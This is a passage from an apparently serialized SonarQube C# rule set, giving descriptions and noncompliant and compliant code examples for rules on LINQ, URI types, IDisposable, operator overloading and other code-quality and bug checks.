  <li> Don't call <code>ToArray()</code> or <code>ToList()</code> in the middle of a query chain. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
seq1.Select(element =&gt; element as T).Any(element =&gt; element != null);  // Noncompliant; use OfType
seq2.Select(element =&gt; element as T).Any(element =&gt; element != null &amp;&amp; CheckCondition(element));  // Noncompliant; use OfType
seq3.Where(element =&gt; element is T).Select(element =&gt; element as T); // Noncompliant; use OfType
seq4.Where(element =&gt; element is T).Select(element =&gt; (T)element); // Noncompliant; use OfType
seq5.Where(element =&gt; [expression]).Any();  // Noncompliant; use Any([expression])

var num = seq6.Count(); // Noncompliant
var arr = seq.ToList().ToArray(); //Noncompliant
var count = seq.ToList().Count(x=&gt;[condition]); //Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
seq1.OfType&lt;T&gt;().Any();
seq2.OfType&lt;T&gt;().Any(element =&gt; CheckCondition(element));
seq3.OfType&lt;T&gt;();
seq4.OfType&lt;T&gt;();
seq5.Any(element =&gt; [expression])

var num = seq6.Count;
var arr = seq.ToArray();
var count = seq.Count(x=&gt;[condition]);
</pre>Z
CODE_SMELL
…
csharpsquid:S3264≥
csharpsquidS3264Events should be invoked"MAJOR*cs:Î<p>Events that are not invoked anywhere are dead code, and there's no good reason to keep them in the source.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class UninvokedEventSample
{
    private event Action&lt;object, EventArgs&gt; Happened; //Noncompliant

    public void RegisterEventHandler(Action&lt;object, EventArgs&gt; handler)
    {
        Happened += handler; //we register some event handlers
    }

    public void RaiseEvent()
    {
        if (Happened != null)
        {
            // Happened(this, null); // the event is never triggered, because this line is commented out.
        }
    }
}
</pre>Z
CODE_SMELL
Ú
csharpsquid:S3262‹
csharpsquidS3262$"params" should be used on overrides"MAJOR*cs:à<p>Overriding methods automatically inherit the <code>params</code> behavior. To ease readability, this modifier should be explicitly used in the
overriding method as well.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Base
{
  public virtual void Method(params int[] numbers)
  {
    ...
  }
}
class Derived : Base
{
  public override void Method(int[] numbers) // Noncompliant, the params is missing.
  {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Base
{
  public virtual void Method(params int[] numbers)
  {
    ...
  }
}
class Derived : Base
{
  public override void Method(params int[] numbers)
  {
    ...
  }
}
</pre>Z
CODE_SMELL
¶
csharpsquid:S3263ê
csharpsquidS3263AStatic fields should appear in the order they must be initialized"MAJOR*cs:¶<p>Static field initializers are executed in the order in which they appear in the class from top to bottom. Thus, placing a static field in a class
above the field or fields required for its initialization will yield unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
  public static int X = Y; // Noncompliant; Y at this time is still assigned default(int), i.e. 0
  public static int Y = 42;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass
{
  public static int Y = 42;
  public static int X = Y;
}
</pre>
<p>or</p>
<pre>
class MyClass
{
  public static int X;
  public static int Y = 42;

  static MyClass()
  {
    X = Y;
  }
}
</pre>ZBUG
©
csharpsquid:S3996ì
csharpsquidS3996$URI properties should not be strings"MAJOR*cs:ø<p>String representations of URIs or URLs are prone to parsing and encoding errors which can lead to vulnerabilities. The <code>System.Uri</code>
class is a safe alternative and should be preferred.</p>
<p>This rule raises an issue when a property is a string type and its name contains "uri", "Uri", "urn", "Urn", "url" or "Url".</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
   public class MyClass
   {
      string myUri;

      public string MyUri // Noncompliant
      {
         get { return myURI; }
         set { myUri = value; }
      }
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
   public class MyClass
   {
      Uri myUri;

      public Uri MyUri
      {
         get { return myURI; }
         set { myUri = value; }
      }
   }
}
</pre>Z
CODE_SMELL
‘	
csharpsquid:S3997æ	
csharpsquidS39977String URI overloads should call "System.Uri" overloads"MAJOR*cs:◊<p>String representations of URIs or URLs are prone to parsing and encoding errors which can lead to vulnerabilities. The <code>System.Uri</code>
class is a safe alternative and should be preferred.</p>
<p>This rule raises an issue when two overloads differ only by the string / <code>Uri</code> parameter and the string overload doesn't call the
<code>Uri</code> overload. It is assumed that the string parameter represents a URI because of the exact match besides that parameter type. It stands
to reason that the safer overload should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
   public class MyClass
   {
      public void FetchResource(string uriString) // Noncompliant
      {
         // No calls to FetResource(Uri)
      }

      public void FetchResource(Uri uri) { }
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
   public class MyClass
   {
      public void FetchResource(string uriString)
      {
          FetchResource(new Uri(uriString));
      }

      public void FetchResource(Uri uri) { }
   }
}
</pre>Z
CODE_SMELL
ø
csharpsquid:S1697©
csharpsquidS1697WShort-circuit logic should be used to prevent null pointer dereferences in conditionals"MAJOR*cs:©<p>When either the equality operator in a null test or the logical operator that follows it is reversed, the code has the appearance of safely
null-testing the object before dereferencing it. Unfortunately the effect is just the opposite - the object is null-tested and then dereferenced
<em>only</em> if it is null, leading to a guaranteed null pointer dereference.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (str == null &amp;&amp; str.Length == 0)
{
  Console.WriteLine("String is empty");
}

if (str != null || str.Length &gt; 0)
{
  Console.WriteLine("String is not empty");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (str == null || str.Length == 0)
{
  Console.WriteLine("String is empty");
}

if (str != null &amp;&amp; str.Length &gt; 0)
{
  Console.WriteLine("String is not empty");
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=csharpsquid%3AS2259'>S2259</a> instead.</p>ZBUG
∫	
csharpsquid:S3994§	
csharpsquidS3994$URI Parameters should not be strings"MAJOR*cs:–<p>String representations of URIs or URLs are prone to parsing and encoding errors which can lead to vulnerabilities. The <code>System.Uri</code>
class is a safe alternative and should be preferred. At minimum, an overload of the method taking a <code>System.Uri</code> as a parameter should be
provided in each class that contains a method with an apparent Uri passed as a <code>string</code>.</p>
<p>This rule raises issues when a method has a string parameter with a name containing "uri", "Uri", "urn", "Urn", "url" or "Url", and the type
doesn't declare a corresponding overload taking an <code>System.Uri</code> parameter instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
   public class MyClass
   {

      public void FetchResource(string uriString) { } // Noncompliant
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
   public class MyClass
   {

      public void FetchResource(string uriString)
      {
          FetchResource(new Uri(uriString));
      }

      public void FetchResource(Uri uri) { }
   }
}
</pre>Z
CODE_SMELL
ë

csharpsquid:S1696˚	
csharpsquidS1696+NullReferenceException should not be caught"MAJOR*cs:†	<p><code>NullReferenceException</code> should be avoided, not caught. Any situation in which <code>NullReferenceException</code> is explicitly caught
can easily be converted to a <code>null</code> test, and any behavior being carried out in the catch block can easily be moved to the "is null" branch
of the conditional.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int GetLengthPlusTwo(string str)
{
    int length = 2;
    try
    {
       length += str.Length;
    }
    catch (NullReferenceException e)
    {
        log.info("argument was null");
    }
    return length;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int GetLengthPlusTwo(string str)
{
    int length = 2;

    if (str != null)
    {
        length += str.Length;
    }
    else
    {
        log.info("argument was null");
    }
    return length;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/395.html">MITRE, CWE-395</a> - Use of NullPointerException Catch to Detect NULL Pointer
  Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/BIB3AQ">CERT, ERR08-J.</a> - Do not catch NullPointerException or any of its ancestors
  </li>
</ul>Z
CODE_SMELL
ö
csharpsquid:S3995Ñ
csharpsquidS3995'URI return values should not be strings"MAJOR*cs:≠<p>String representations of URIs or URLs are prone to parsing and encoding errors which can lead to vulnerabilities. The <code>System.Uri</code>
class is a safe alternative and should be preferred.</p>
<p>This rule raises an issue when a method has a <code>string</code> return type and its name contains "Uri", "Urn", or "Url" or begins with "uri",
"urn", or "url".</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
   public class MyClass
   {
      public string GetParentUri() // Noncompliant
      {
         return "http://www.mysite.com";
      }
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
   public class MyClass
   {

      public Uri GetParentUri()
      {
         return new URI("http://www.mysite.com");
      }
   }
}
</pre>Z
CODE_SMELL
¢
csharpsquid:S3992å
csharpsquidS39923Assemblies should explicitly specify COM visibility"MAJOR*cs:©<p>Assemblies should explicitly indicate whether they are meant to be COM visible or not. If the <code>ComVisibleAttribute</code> is not present, the
default is to make the content of the assembly visible to COM clients.</p>
<p>Note that COM visibility can be overridden for individual types and members.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary  // Noncompliant
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

[assembly: System.Runtime.InteropServices.ComVisible(false)]
namespace MyLibrary
{
}
</pre>Z
CODE_SMELL
ã	
csharpsquid:S3993ı
csharpsquidS3993HCustom attributes should be marked with "System.AttributeUsageAttribute""MAJOR*cs:˝<p>When defining custom attributes, <code>System.AttributeUsageAttribute</code> must be used to indicate where the attribute can be applied. This will
determine its valid locations in the code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{

   public sealed class MyAttribute :Attribute // Noncompliant
   {
      string text;

      public MyAttribute(string myText)
      {
         text = myText;
      }
      public string Text
      {
         get
         {
            return text;
         }
      }
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{

   [AttributeUsage(AttributeTargets.Class | AttributeTargets.Enum | AttributeTargets.Interface | AttributeTargets.Delegate)]
   public sealed class MyAttribute :Attribute
   {
      string text;

      public MyAttribute(string myText)
      {
         text = myText;
      }
      public string Text
      {
         get
         {
            return text;
         }
      }
   }
}
</pre>Z
CODE_SMELL
¿
csharpsquid:S3990™
csharpsquidS3990,Assemblies should be marked as CLS compliant"MAJOR*cs:Œ<p>Assemblies should conform with the Common Language Specification (CLS) in order to be usable across programming languages. To be compliant an
assembly has to indicate it with <code>System.CLSCompliantAttribute</code>.</p>
<h2>Compliant Solution</h2>
<pre>
using System;

[assembly:CLSCompliant(true)]
namespace MyLibrary
{
}
</pre>Z
CODE_SMELL
≥
csharpsquid:S3885ù
csharpsquidS3885"Assembly.Load" should be used"MAJOR*cs:œ<p>The parameter to <code>Assembly.Load</code> includes the full specification of the dll to be loaded. Use another method, and you might end up with
a dll other than the one you expected. </p>
<p>This rule raises an issue when <code>Assembly.LoadFrom</code>, <code>Assembly.LoadFile</code>, or <code>Assembly.LoadWithPartialName</code> is
called.</p>
<h2>Noncompliant Code Example</h2>
<pre>
static void Main(string[] args)
{
    Assembly.LoadFrom(...); // Noncompliant
    Assembly.LoadFile(...); // Noncompliant
    Assembly.LoadWithPartialName(...); // Noncompliant + deprecated
}
</pre>Z
CODE_SMELL
‰
csharpsquid:S4059Œ
csharpsquidS4059+Property names should not match get methods"MAJOR*cs:Û<p>Properties and Get method should have names that makes them clearly distinguishable.</p>
<p>This rule raises an issue when the name of a public or protected member starts with 'Get' and otherwise matches the name of a public or protected
property.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
    public class Foo
    {
        public DateTime Date
        {
            get { return DateTime.Today; }
        }

        public string GetDate() // Noncompliant
        {
            return this.Date.ToString();
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
    public class Foo
    {
        public DateTime Date
        {
            get { return DateTime.Today; }
        }

        public string GetDateAsString()
        {
            return this.Date.ToString();
        }
    }
}
</pre>Z
CODE_SMELL
ˇ
csharpsquid:S3880È
csharpsquidS3880Finalizers should not be empty"MAJOR*cs:õ<p>Finalizers come with a performance cost due to the overhead of tracking the life cycle of objects. An empty one is consequently costly with no
benefit or justification.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
    ~Foo() // Noncompliant
    {
    }
}
</pre>Z
CODE_SMELL
‚
csharpsquid:S4057Ã
csharpsquidS4057$Locales should be set for data types"MAJOR*cs:¯<p>When you create a <code>DataTable</code> or <code>DataSet</code>, you should set the locale explicitly. By default, the locale for these types is
the current culture. For data that is stored in a database or file and is shared globally, the locale should ordinarily be set to the invariant
culture (<code>CultureInfo.InvariantCulture</code>).</p>
<p>This rule raises an issue when <code>System.Data.DataTable</code> or <code>System.Data.DataSet</code> instances are created without explicitly
setting the locale property (<code>DataTable.Locale</code> or <code>DataSet.Locale</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Data;

namespace MyLibrary
{
    public class Foo
    {
        public DataTable CreateTable()
        {
            DataTable table = new DataTable("Customers"); // Noncompliant table.Locale not set
            DataColumn key = table.Columns.Add("ID", typeof(Int32));

            key.AllowDBNull = false;
            key.Unique = true;
            table.Columns.Add("LastName", typeof(String));
            table.Columns.Add("FirstName", typeof(String));
            return table;
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Data;
using System.Globalization;

namespace MyLibrary
{
    public class Foo
    {
        public DataTable CreateTable()
        {
            DataTable table = new DataTable("Customers");
            table.Locale = CultureInfo.InvariantCulture;
            DataColumn key = table.Columns.Add("ID", typeof(Int32));

            key.AllowDBNull = false;
            key.Unique = true;
            table.Columns.Add("LastName", typeof(String));
            table.Columns.Add("FirstName", typeof(String));
            return table;
        }
    }
}
</pre>Z
CODE_SMELL
¯#
csharpsquid:S3881‚#
csharpsquidS3881-"IDisposable" should be implemented correctly"MAJOR*cs:Ö#<p>The <code>IDisposable</code> interface is a mechanism to release unmanaged resources, if not implemented correctly this could result in resource
leaks or more severe bugs.</p>
<p>This rule raises an issue when the recommended dispose pattern, as defined by Microsoft, is not adhered to. See the <strong>Compliant
Solution</strong> section for examples.</p>
<p>Satisfying the rule's conditions will enable potential derived classes to correctly dispose the members of your class:</p>
<ul>
  <li> <code>sealed</code> classes are not checked. </li>
  <li> If a base class implements <code>IDisposable</code> your class should not have <code>IDisposable</code> in the list of its interfaces. In such
  cases it is recommended to override the base class's <code>protected virtual void Dispose(bool)</code> method or its equivalent. </li>
  <li> The class should not implement <code>IDisposable</code> explicitly, e.g. the <code>Dispose()</code> method should be public. </li>
  <li> The class should contain <code>protected virtual void Dispose(bool)</code> method. This method allows the derived classes to correctly dispose
  the resources of this class. </li>
  <li> The content of the <code>Dispose()</code> method should be invocation of <code>Dispose(true)</code> followed by
  <code>GC.SuppressFinalize(this)</code> </li>
  <li> If the class has a finalizer, i.e. a destructor, the only code in its body should be a single invocation of <code>Dispose(false)</code>. </li>
  <li> If the class inherits from a class that implements <code>IDisposable</code> it must call the <code>Dispose</code>, or
  <code>Dispose(bool)</code> method of the base class from within its own implementation of <code>Dispose</code> or <code>Dispose(bool)</code>,
  respectively. This ensures that all resources from the base class are properly released. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo1 : IDisposable // Noncompliant - provide protected overridable implementation of Dispose(bool) on Foo or mark the type as sealed.
{
    public void Dispose() // Noncompliant - should contain only a call to Dispose(true) and then GC.SuppressFinalize(this)
    {
        // Cleanup
    }
}

public class Foo2 : IDisposable
{
    void IDisposable.Dispose() // Noncompliant - Dispose() should be public
    {
        Dispose(true);
        GC.SuppressFinalize(this);
    }

    public virtual void Dispose() // Noncompliant - Dispose() should be sealed
    {
        Dispose(true);
        GC.SuppressFinalize(this);
    }
}

public class Foo3 : IDisposable
{
    public void Dispose()
    {
        Dispose(true);
        GC.SuppressFinalize(this);
    }

    protected virtual void Dispose(bool disposing)
    {
        // Cleanup
    }

    ~Foo3() // Noncompliant - Modify Foo.~Foo() so that it calls Dispose(false) and then returns.
    {
        // Cleanup
    }
}{code}
</pre>
<h2>Compliant Solution</h2>
<pre>
// Sealed class
public sealed class Foo1 : IDisposable
{
    public void Dispose()
    {
        // Cleanup
    }
}

// Simple implementation
public class Foo2 : IDisposable
{
    public void Dispose()
    {
        Dispose(true);
        GC.SuppressFinalize(this);
    }

    protected virtual void Dispose(bool disposing)
    {
        // Cleanup
    }
}

// Implementation with a finalizer
public class Foo3 : IDisposable
{
    public void Dispose()
    {
        Dispose(true);
        GC.SuppressFinalize(this);
    }

    protected virtual void Dispose(bool disposing)
    {
        // Cleanup
    }

    ~Foo3()
    {
        Dispose(false);
    }
}

// Base disposable class
public class Foo4 : DisposableBase
{
    protected override void Dispose(bool disposing)
    {
        // Cleanup
        // Do not forget to call base
        base.Dispose(disposing);
    }
}
</pre>
<h2>See</h2>
<p>Refer to </p>
<ul>
  <li> <a href="https://msdn.microsoft.com/en-us/library/498928w2.aspx">MSDN</a> for complete documentation on the dispose pattern. </li>
  <li> <a href="http://blog.stephencleary.com/2009/08/how-to-implement-idisposable-and.html">Stephen Cleary</a> for excellent Q&amp;A about
  IDisposable </li>
  <li> <a href="http://pragmateek.com/c-scope-your-global-state-changes-with-idisposable-and-the-using-statement/">Pragma Geek</a> for additional
  usages of IDisposable, beyond releasing resources. </li>
  <li> <a href="https://docs.microsoft.com/en-us/dotnet/api/system.idisposable?view=netframework-4.7">IDisposable documentation</a> </li>
</ul>Z
CODE_SMELL
Ì
csharpsquid:S2436◊
csharpsquidS2436=Types and methods should not have too many generic parameters"MAJOR*cs:Í<p>A method or class with too many type parameters has likely aggregated too many responsibilities and should be split.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default parameter value of 2:</p>
<pre>
&lt;S, T, U, V&gt; void foo() {} // Noncompliant; not really readable
&lt;String, Integer, Object, String&gt;foo(); // especially on invocations
</pre>Z
CODE_SMELL
º
csharpsquid:S4055¶
csharpsquidS40555Literals should not be passed as localized parameters"MAJOR*cs:¡<p>String literals embedded in the source code will not be localized properly.</p>
<p>This rule raises an issue when a literal string is passed as a parameter or property and one or more of the following cases is true:</p>
<ul>
  <li> The <code>LocalizableAttribute</code> attribute of the parameter or property is set to true. </li>
  <li> The parameter or property name contains "Text", "Message", or "Caption". </li>
  <li> The name of the string parameter that is passed to a <code>Console.Write</code> or <code>Console.WriteLine</code> method is either "value" or
  "format". </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Globalization;
using System.Reflection;
using System.Windows.Forms;

[assembly: NeutralResourcesLanguageAttribute("en-US")]
namespace MyLibrary
{
    public class Foo
    {
        public void SetHour(int hour)
        {
            if (hour &lt; 0 || hour &gt; 23)
            {
                MessageBox.Show("The valid range is 0 - 23."); // Noncompliant
            }
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Globalization;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;



[assembly: NeutralResourcesLanguageAttribute("en-US")]
namespace MyLibrary
{
    public class Foo
    {
        ResourceManager rm;
        public Foo()
        {
            rm = new ResourceManager("en-US", Assembly.GetExecutingAssembly());
        }

        public void SetHour(int hour)
        {
            if (hour &lt; 0 || hour &gt; 23)
            {
                MessageBox.Show(
                rm.GetString("OutOfRangeMessage", CultureInfo.CurrentUICulture));
            }
        }
    }
}
</pre>Z
CODE_SMELL
î
csharpsquid:S4050˛
csharpsquidS4050+Operators should be overloaded consistently"MAJOR*cs:£<p>When implementing operator overloads, it is very important to make sure that all related operators and methods are consistent in their
implementation.</p>
<p>The following guidelines should be followed:</p>
<ul>
  <li> When providing <code>operator ==</code> you should also provide <code>operator !=</code> and vice-versa. </li>
  <li> When providing <code>operator ==</code> you should also provide <code>Equals(Object)</code> and <code>GetHashCode()</code>. </li>
  <li> When providing <code>operator +</code> or <code>operator -</code> you should also provide <code>operator ==</code>, respecting previous
  guidelines. </li>
</ul>
<p>This rule raises an issue when any of these guidelines are not followed on publicly-visible type (public, protected or protected internal).</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  public class Foo // Noncompliant
  {
    private int left;
    private int right;

    public Foo(int l, int r)
    {
      this.left = l;
      this.right = r;
    }

    public static Foo operator +(Foo a, Foo b)
    {
      return new Foo(a.left + b.left, a.right + b.right);
    }

    public static Foo operator -(Foo a, Foo b)
    {
      return new Foo(a.left - b.left, a.right - b.right);
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
  public class Foo
  {
    private int left;
    private int right;

    public Foo(int l, int r)
    {
      this.left = l;
      this.right = r;
    }

    public static Foo operator +(Foo a, Foo b)
    {
      return new Foo(a.left + b.left, a.right + b.right);
    }

    public static Foo operator -(Foo a, Foo b)
    {
      return new Foo(a.left - b.left, a.right - b.right);
    }

    public static bool operator ==(Foo a, Foo b)
    {
      return (a.left == b.left &amp;&amp; a.right == b.right);
    }

    public static bool operator !=(Foo a, Foo b)
    {
      return !(a == b);
    }

    public override bool Equals(Object obj)
    {
      Foo a = obj as Foo;
      if (a == null)
        return false;
      return this == a;
    }

    public override int GetHashCode()
    {
       return (this.left * 10) + this.right;
    }
  }
}
</pre>Z
CODE_SMELL
π
csharpsquid:S3610£
csharpsquidS36100Nullable type comparison should not be redundant"MAJOR*cs: <p>Calling <code>GetType()</code> on a nullable object returns the underlying value type. Thus, comparing the returned <code>Type</code> object to
<code>typeof(Nullable&lt;SomeType&gt;)</code> doesn't make sense. The comparison either throws an exception or the result can be known at compile
time.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int? nullable = 42;
bool comparison = nullable.GetType() == typeof(Nullable&lt;int&gt;); // Noncompliant, always false
comparison = nullable.GetType() != typeof(Nullable&lt;int&gt;); // Noncompliant, always true

nullable = null;
comparison = nullable.GetType() != typeof(Nullable&lt;int&gt;); // Noncompliant, calling GetType on a null always throws an exception
</pre>ZBUG
√
csharpsquid:S2761≠
csharpsquidS27619Doubled prefix operators "!!" and "~~" should not be used"MAJOR*cs:À<p>Calling the <code>!</code> or <code>~</code> prefix operator twice does nothing: the second invocation undoes the first. Such mistakes are
typically caused by accidentally double-tapping the key in question without noticing.</p>
<p>Either this is a bug, if the operator was actually meant to be called once, or misleading if done on purpose.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int v1 = 0;
bool v2 = false;

var v3 = !!v1; // Noncompliant
var v4 = ~~v2; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int v1 = 0;
bool v2 = false;

var v3 = !v1;
var v4 = ~v2;
</pre>ZBUG
≈
csharpsquid:S4144Ø
csharpsquidS41441Methods should not have identical implementations"MAJOR*cs:Œ<p>When two methods have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but may
be confusing to maintainers. In the latter case, one implementation should invoke the other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private const string CODE = "bounteous";
private int callCount = 0;

public string GetCode()
{
  callCount++;
  return CODE;
}

public string GetName()  // Noncompliant
{
  callCount++;
  return CODE;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private const string CODE = "bounteous";
private int callCount = 0;

public string GetCode()
{
  callCount++;
  return CODE;
}

public string GetName()
{
  return GetCode();
}
</pre>
<h2>Exceptions</h2>
<p>Empty methods, methods with only one line of code and methods with the same name (overload) are ignored.</p>Z
CODE_SMELL
Ì
csharpsquid:S3971◊
csharpsquidS3971*"GC.SuppressFinalize" should not be called"MAJOR*cs:˝<p><code>GC.SuppressFinalize</code> requests that the system not call the finalizer for the specified object. This should only be done when
implementing <code>Dispose</code> as part of the <a href="https://msdn.microsoft.com/en-us/library/b1yfkh5e.aspx">Dispose Pattern</a>.</p>
<p>This rule raises an issue when <code>GC.SuppressFinalize</code> is called outside that pattern.</p>Z
CODE_SMELL
Ã
csharpsquid:S4143∂
csharpsquidS4143:Collection elements should not be replaced unconditionally"MAJOR*cs:”<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely errors.</p>
<h2>Noncompliant Code Example</h2>
<pre>
list[index] = "value 1";
list[index] = "value 2";  // Noncompliant

dictionary.Add(key, "value 1");
dictionary[key] = "value 2"; // Noncompliant
</pre>ZBUG
”
csharpsquid:S3172Ω
csharpsquidS3172"Delegates should not be subtracted"MAJOR*cs:Ú
<p>In C#, delegates can be added together to chain their execution, and subtracted to remove their execution from the chain.</p>
<p>Subtracting a chain of delegates from another one might yield unexpected results as shown hereunder - and is likely to be a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MyDelegate first, second, third, fourth;
first = () =&gt; Console.Write("1");
second = () =&gt; Console.Write("2");
third = () =&gt; Console.Write("3");
fourth = () =&gt; Console.Write("4");

MyDelegate chain1234 = first + second + third + fourth; // Compliant - chain sequence = "1234"
MyDelegate chain12 = chain1234 - third - fourth; // Compliant - chain sequence = "12"


MyDelegate chain14 = first + fourth; // creates a new MyDelegate instance which is a list under the covers
MyDelegate chain23 = chain1234 - chain14; // Noncompliant; (first + fourth) doesn't exist in chain1234


// The chain sequence of "chain23" will be "1234" instead of "23"!
// Indeed, the sequence "1234" does not contain the subsequence "14", so nothing is subtracted
// (but note that "1234" contains both the "1" and "4" subsequences)
chain23 = chain1234 - (first + fourth); // Noncompliant

chain23(); // will print "1234"!
</pre>
<h2>Compliant Solution</h2>
<pre>
MyDelegate chain23 = chain1234 - first - fourth; // Compliant - "1" is first removed, followed by "4"

chain23(); // will print "23"
</pre>ZBUG
†
csharpsquid:S4142ä
csharpsquidS41422Duplicate values should not be passed as arguments"MAJOR*cs:®<p>There are valid cases for passing a variable multiple times into the same method call, but usually doing so is a mistake, and something else was
intended for one of the arguments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (Compare(point.X, point.X) != 0) // Noncompliant
{
&nbsp;&nbsp;//...
}

if (DoSomething(GetNextValue(), GetNextValue()))  // Noncompliant
{
&nbsp;&nbsp;// ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (Compare(point.X, point.Y) != 0)
{
&nbsp;&nbsp;//...
}

var v1 = GetNextValue();
var v2 = GetNextValue();
if (DoSomething(v1, v2))
{
&nbsp;&nbsp;// ...
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
¨	
csharpsquid:S4260ñ	
csharpsquidS4260="ConstructorArgument" parameters should exist in constructors"MAJOR*cs:∞<p>When creating a custom Markup Extension that accepts parameters in WPF, the <code>ConstructorArgument</code> markup must be used to identify the
discrete properties that match these parameters. However since this is done via a string, the compiler will not notice if there are typos.</p>
<p>This rule raises an issue when the string argument to <code>ConstructorArgumentAttribute</code> doesn't match any parameter of any constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace myLibrary
{
  public class MyExtension : MarkupExtension
  {
    public MyExtension() { }

    public MyExtension(object value1)
    {
      Value1 = value1;
    }

    [ConstructorArgument("value2")]
    public object Value1 { get; set; }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace myLibrary
{
  public class MyExtension : MarkupExtension
  {
    public MyExtension() { }

    public MyExtension(object value1)
    {
      Value1 = value1;
    }

    [ConstructorArgument("value1")]
    public object Value1 { get; set; }
  }
}
</pre>ZBUG
–
csharpsquid:S3984∫
csharpsquidS39844Exception should not be created without being thrown"MAJOR*cs:›<p>Creating a new <code>Exception</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0)
{
  new ArgumentException("x must be nonnegative");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0)
{
  throw new ArgumentException("x must be nonnegative");
}
</pre>ZBUG
œ
csharpsquid:S1200π
csharpsquidS1200YClasses should not be coupled to too many other classes (Single Responsibility Principle)"MAJOR*cs:∞
<p>According to the Single Responsibility Principle, introduced by Robert C. Martin in his book "Principles of Object Oriented Design", a class should
have only one responsibility:</p>
<blockquote>
  <p>If a class has more than one responsibility, then the responsibilities become coupled.</p>
  <p>Changes to one responsibility may impair or inhibit the class' ability to meet the others.</p>
  <p>This kind of coupling leads to fragile designs that break in unexpected ways when changed.</p>
</blockquote>
<p>Classes which rely on many other classes tend to aggregate too many responsibilities and should be split into several smaller ones.</p>
<p>Nested classes dependencies are not counted as dependencies of the outer class.</p>
<h2>Noncompliant Code Example</h2>
<p>With a threshold of 5:</p>
<pre>
public class Foo    // Noncompliant - Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7
{
  private T1 a1;    // Foo is coupled to T1
  private T2 a2;    // Foo is coupled to T2
  private T3 a3;    // Foo is coupled to T3

  public T4 Compute(T5 a, T6 b)    // Foo is coupled to T4, T5 and T6
  {
    T7 result = a.Process(b);    // Foo is coupled to T7
    return result;
  }

  public static class Bar    // Compliant - Bar depends on 2 classes: T8 and T9
  {
    public T8 a8;
    public T9 a9;
  }
}
</pre>Z
CODE_SMELL
Œ
csharpsquid:S3981∏
csharpsquidS3981?Collection sizes and array length comparisons should make sense"MAJOR*cs:–<p>The size of a collection and the length of an array are always greater than or equal to zero. So testing that a size or length is greater than or
equal to zero doesn't make sense, since the result is always <code>true</code>. Similarly testing that it is less than zero will always return
<code>false</code>. Perhaps the intent was to check the non-emptiness of the collection or array instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if(collection.Count &gt;= 0){...}

if(enumerable.Count() &lt; 0){...}

if(array.Length &gt;= 0){...}

bool result = array.Length &gt;=0;
</pre>
<h2>Compliant Solution</h2>
<pre>
if (list.Any()) { ... }

if (list.Count &gt; 0) { ... }

if (array.Length &gt;= 42) { ... }
</pre>ZBUG
‚
csharpsquid:S4035Ã
